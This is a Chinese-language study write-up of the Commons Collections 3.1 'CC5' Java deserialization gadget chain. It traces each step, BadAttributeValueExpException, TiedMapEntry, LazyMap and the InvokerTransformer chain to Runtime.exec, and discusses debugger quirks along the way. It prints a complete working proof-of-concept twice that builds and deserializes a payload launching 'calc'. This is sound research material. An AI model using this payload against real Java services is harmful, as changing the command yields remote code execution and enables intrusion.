# 环境搭建

- JDK 1.8
- Commons Collections 3.1

```
<dependencies>
    <dependency>
        <groupId>commons-collections</groupId>
        <artifactId>commons-collections</artifactId>
        <version>3.1</version>
    </dependency>
</dependencies>
```

# 利用链分析

**利用链**

```
ObjectInputStream.readObject()
            BadAttributeValueExpException.readObject()
                TiedMapEntry.toString()
                    LazyMap.get()
                        ChainedTransformer.transform()
                            ConstantTransformer.transform()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Class.getMethod()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.getRuntime()
                            InvokerTransformer.transform()
                                Method.invoke()
                                    Runtime.exec()
```

**POC**

```
package CC5;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC5payload {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        ChainedTransformer chain = new ChainedTransformer(transformers);

        Map innermap = new HashMap();
        Map outmap = LazyMap.decorate(innermap,chain);

        TiedMapEntry tiedMap = new TiedMapEntry(outmap,"DawnT0wn");
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1);
        Field field = BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException,tiedMap);

        ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("CC5.bin"));
        os.writeObject(badAttributeValueExpException);

        ObjectInputStream fos = new ObjectInputStream(new FileInputStream("CC5.bin"));
        fos.readObject();
    }
}

```

可以看到,从LazyMap开始就和CC1的是一模一样的了,打断点调试着来分析看看

直接从BadAttributeValueExpException类重写的readObject开始

一路执行到了toString方法

![image-20220126115359827](images/1.png)

但是不知道为什么前面在这里突然执行了命令,可能是调试的问题,当我断点打在LazyMap的时候这里就不弹计算器了,等会再说下一个遇到的问题

![image-20220126115328478](images/2.png)

```
Object valObj = gf.get("val", null);
```

valobj是这么来的,是直接获取`gf`中的val参数的值,而`gf`是通过反序列化流获取的值,那么val参数就可以在反序列化的过程中对其进行控制,所以这里我们可以去调用一个TiedMapEntry类的toString方法

```
public String toString() {
    return getKey() + "=" + getValue();
}
```

但是要注意该类的构造函数,不能直接对val赋值不然这里也会去调用TiedMapEntry类的toString

![image-20220126115742104](images/3.png)

所以可以在实例化该类后通过反射对val参数进行控制,对应的poc中代码

```
TiedMapEntry tiedMap = new TiedMapEntry(outmap,"DawnT0wn");
BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1);
Field field = BadAttributeValueExpException.class.getDeclaredField("val");
field.setAccessible(true);
field.set(badAttributeValueExpException,tiedMap);
```

跟进getValue方法

```
public Object getValue() {
    return map.get(key);
}
```

再看构造器

```
public TiedMapEntry(Map map, Object key) {
    super();
    this.map = map;
    this.key = key;
}
```

map和key都是可控的,那这里就可以回到我们之前熟悉的LazyMap的中get方法来了

```
public Object get(Object key) {
    // create value for key if key is not currently in the map
    if (map.containsKey(key) == false) {
        Object value = factory.transform(key);
        map.put(key, value);
        return value;
    }
    return map.get(key);
}
```

在这里还遇到了另外一个问题,就是我断点一路跟过来并没有进入if,我在前面也看了,并没有和我Key相对应的映射关系,这里应该返回的值是false才对啊,之前这里有key值一样能进入if

![image-20220126120254955](images/4.png)

但是在网上看到师傅也出现了这样的问题,把前面断点取消,直接在if中打断点就可以进入,而且重新进行断点调试的时候也没有弹计算器了,也就不存在刚才的问题了,这可能是IDEA调试机制的问题吧,不过没什么影响,能成功说明程序能够执行到这里

继续从get方法出发

![image-20220126120550754](images/5.png)

这下就再熟悉不过了调用transform方法,直接就和CC1一样,对应代码

```
Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
        new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
};

ChainedTransformer chain = new ChainedTransformer(transformers);
```

# 漏洞复现

完整的poc刚才已经贴出来了

```
package CC5;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CC5payload {
    public static void main(String[] args) throws Exception{
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod",new Class[]{String.class,Class[].class},new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke",new Class[]{Object.class,Object[].class},new Object[]{null,null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        ChainedTransformer chain = new ChainedTransformer(transformers);

        Map innermap = new HashMap();
        Map outmap = LazyMap.decorate(innermap,chain);

        TiedMapEntry tiedMap = new TiedMapEntry(outmap,"DawnT0wn");
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(1);
        Field field = BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException,tiedMap);

        ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("CC5.bin"));
        os.writeObject(badAttributeValueExpException);

        ObjectInputStream fos = new ObjectInputStream(new FileInputStream("CC5.bin"));
        fos.readObject();
    }
}
```

![image-20220126120830727](images/6.png)

# 遇到的问题

就还是断点调试的问题,复现过CC1这些对这个执行过程应该是已经很熟悉了

就是第一次为什么会突然弹计算器出来

![image-20220126115328478](images/2.png)

而且LazyMap.get方法的if没有进去

而取消前面断点后,可以进入if,而且也不弹计算器了

![image-20220126120550754](images/5.png)



参考链接

https://xz.aliyun.com/t/10457#toc-4